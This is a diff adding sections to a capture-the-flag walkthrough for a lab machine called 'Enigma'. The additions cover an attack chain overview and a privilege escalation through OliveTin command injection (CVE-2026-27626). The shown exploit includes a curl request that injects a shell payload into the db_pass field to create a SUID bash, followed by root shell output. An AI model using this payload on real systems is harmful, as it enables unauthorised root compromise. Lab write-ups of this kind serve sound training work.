@@ -10,8 +10,41 @@
 | Release Date | 27th June, 2026 |
 
 ## Overview  
+Enigma is a Linux machine that starts with an NFS share leaking onboarding documents, leading through credential reuse across a webmail portal and OpenSTAManager (CVE-2025-69212 RCE) to a low-privileged shell, and ends with a database-stored bcrypt hash cracked to pivot into a local user, ultimately escalating to root via a command injection in OliveTin (CVE-2026-27626).
 
+### Skills / Techniques
 
+NFS Enumeration & Mounting
+Sensitive Document Extraction (PDF)
+Credential / Password Reuse
+IMAP/POP3 Mailbox Access
+Virtual Host Discovery
+CVE Research & Exploitation (OpenSTAManager RCE)
+Web Shell Upload & Execution
+Reverse Shell
+Database Credential Discovery
+Hash Identification & Cracking (bcrypt)
+Lateral Movement
+SSH Key Persistence
+SSH Port Forwarding (Local Service Tunneling)
+Local Service Discovery (OliveTin)
+Command Injection
+Privilege Escalation
+Linux Post-Exploitation Enumeration
+
+### Table of Contents
+
+Reconnaissance
+NFS Enumeration
+Initial Access (Webmail & IMAP)
+Web Application Exploitation (OpenSTAManager)
+Foothold & Reverse Shell
+Database Credential Harvesting
+Lateral Movement to Local User
+Persistence via SSH Key
+Internal Service Discovery (SSH Tunneling)
+Privilege Escalation (OliveTin Command Injection)
+Root Access
 
 ## RECON  
 
@@ -336,8 +369,10 @@ curl -i http://localhost:1337/
 [...]
 <title>OliveTin</title>
 [...]
+v3000.10.0
+[...]
 ```
-The service turns out to be OliveTin, a web UI for running predefined shell commands. We check what it's running as:  
+The service turns out to be OliveTin version OliveTin 3000.10.0, a web UI for running predefined shell commands. We check what it's running as:  
 ```
 ps aux | grep -i '[o]livetin'
 root        1510  0.0  0.5 1240144 22000 ?       Ssl  11:43   0:00 /usr/local/bin/OliveTin
@@ -349,7 +384,60 @@ We look for public advisories or CVEs affecting OliveTin:
 [GitHub Advisory - GHSA-49gm-hh7w-wfvf](https://github.com/advisories/GHSA-49gm-hh7w-wfvf)
 [NVD - CVE-2026-27626](https://nvd.nist.gov/vuln/detail/CVE-2026-27626)
 
-  
+### Exploiting OliveTin (CVE-2026-27626)
+We intercept traffic with Burp while interacting with the OliveTin web UI, and trigger the "backup database" predefined action. This reveals the underlying API call:  
+
+```
+POST /api/olivetin.api.v1.OliveTinApiService/StartAction HTTP/1.1
+Host: 127.0.0.1:1337
+Content-Length: 202
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+sec-ch-ua-platform: "Linux"
+Accept-Language: en-US,en;q=0.9
+sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
+content-type: application/json
+sec-ch-ua-mobile: ?0
+connect-protocol-version: 1
+Accept: */*
+Origin: http://127.0.0.1:1337
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://127.0.0.1:1337/actionBinding/backup_database/argumentForm
+Accept-Encoding: gzip, deflate, br
+Cookie: lang=en-US
+Connection: keep-alive
+
+{"bindingId":"backup_database","arguments":[{"name":"db_user","value":"backup_svc"},{"name":"db_pass"},{"name":"db_name","value":"production"}],"uniqueTrackingId":"79432ab6-8454-447c-be62-12b0a068ca15"}
+```
+
+The vulnerable endpoint is /api/olivetin.api.v1.OliveTinApiService/StartAction, which takes a bindingId and a list of arguments that get passed into the underlying shell command without proper sanitization. The db_pass argument is unsanitized and gets concatenated directly into the shell command executed by the action, making it injectable.    
+
+### Crafting the Exploit  
+We inject a malicious payload into the db_pass parameter to break out of the intended command and execute our own, copying /bin/bash to /tmp/rootbash and setting the SUID bit on it:  
+```
+curl -s -X POST 'http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartAction' \
+  -H 'content-type: application/json' \
+  -H 'connect-protocol-version: 1' \
+  --data '{"bindingId":"backup_database","arguments":[{"name":"db_user","value":"backup_svc"},{"name":"db_pass","value":"x'\''; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; #"},{"name":"db_name","value":"production"}],"uniqueTrackingId":"rootbash-008"}'
+```
+Since OliveTin runs as root, the injected command executes with root privileges, creating a SUID copy of bash:  
+```
+ls -la /tmp/rootbash
+-rwsr-xr-x 1 root root 1446024 Jun 28 21:28 /tmp/rootbash
+```
+### Privilege Escalation to Root  
+We execute the SUID bash binary with the -p flag to preserve privileges:  
+```
+/tmp/rootbash -p
+rootbash-5.2# id
+uid=1000(haris) gid=1000(haris) euid=0(root) groups=1000(haris),100(users)
+```
+We now have an effective UID of 0 (root). Reading the root flag confirms full ownership of the box:  
+rootbash-5.2# cat /root/root.txt  
+<redacted>  
+
+ 
 
 
 
